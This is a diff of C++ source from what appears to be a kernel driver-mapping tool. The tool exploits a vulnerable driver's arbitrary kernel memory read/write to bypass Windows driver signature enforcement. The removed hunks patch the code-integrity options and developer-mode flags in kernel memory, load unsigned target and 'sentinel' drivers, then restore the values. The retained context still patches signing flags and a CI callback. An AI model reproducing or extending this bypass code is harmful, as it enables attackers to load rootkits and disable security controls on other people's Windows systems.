@@ -361,84 +361,11 @@ namespace MapperCore {
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                 KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                             }
-                            goto done;
                         }
                     }
                 }
             }
         }
-
-
-        {
-            PVOID ciOptionsAddr = nullptr;
-            if (KernelUtils::GetCiOptionsAddress(&ciOptionsAddr)) {
-                DWORD currentOptions = 0;
-                status = VulnDriver::ReadKernelMemory(deviceHandle, ciOptionsAddr, &currentOptions, sizeof(DWORD));
-                if (NT_SUCCESS(status)) {
-                    g_CiOptionsAddress = ciOptionsAddr;
-                    g_OriginalCiOptions = currentOptions;
-
-                    DWORD patchedOptions = currentOptions | 0x8;
-                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &patchedOptions, sizeof(DWORD));
-                    if (NT_SUCCESS(status)) {
-                        g_CiOptionsPatched = true;
-                        status = DriverLoader::LoadDriver(g_DriverServicePath);
-                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
-                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
-                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
-                        }
-
-                        VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &g_OriginalCiOptions, sizeof(DWORD));
-                        g_CiOptionsPatched = false;
-                        if (NT_SUCCESS(status)) {
-                            KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
-                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
-                                KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
-                            }
-                            goto done;
-                        }
-                    }
-                }
-            }
-        }
-
-
-        {
-            PVOID ciDevModeAddr = nullptr;
-            if (KernelUtils::GetCiDeveloperModeAddress(&ciDevModeAddr)) {
-                DWORD currentDevMode = 0;
-                status = VulnDriver::ReadKernelMemory(deviceHandle, ciDevModeAddr, &currentDevMode, sizeof(DWORD));
-                if (NT_SUCCESS(status)) {
-                    g_CiDevModeAddress = ciDevModeAddr;
-                    g_OriginalCiDevMode = currentDevMode;
-
-
-                    DWORD patchedDevMode = currentDevMode | 0x200 | 0x8000;
-                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &patchedDevMode, sizeof(DWORD));
-                    if (NT_SUCCESS(status)) {
-                        g_CiDevModePatched = true;
-                        status = DriverLoader::LoadDriver(g_DriverServicePath);
-                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
-                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
-                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
-                        }
-
-                        VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &g_OriginalCiDevMode, sizeof(DWORD));
-                        g_CiDevModePatched = false;
-                        if (NT_SUCCESS(status)) {
-                            KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
-                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
-                                KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
-                            }
-                            goto done;
-                        }
-                    }
-                }
-            }
-            status = STATUS_UNSUCCESSFUL;
-        }
-
-done:
 
 
         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
@@ -738,22 +665,6 @@ done:
 
     NTSTATUS RestoreCiCallback(HANDLE device) {
         NTSTATUS status = STATUS_SUCCESS;
-
-
-        if (g_CiDevModePatched && g_CiDevModeAddress) {
-            status = VulnDriver::WriteKernelMemory(device, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
-            if (NT_SUCCESS(status)) {
-                g_CiDevModePatched = false;
-            }
-        }
-
-
-        if (g_CiOptionsPatched && g_CiOptionsAddress) {
-            status = VulnDriver::WriteKernelMemory(device, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
-            if (NT_SUCCESS(status)) {
-                g_CiOptionsPatched = false;
-            }
-        }
 
 
         if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
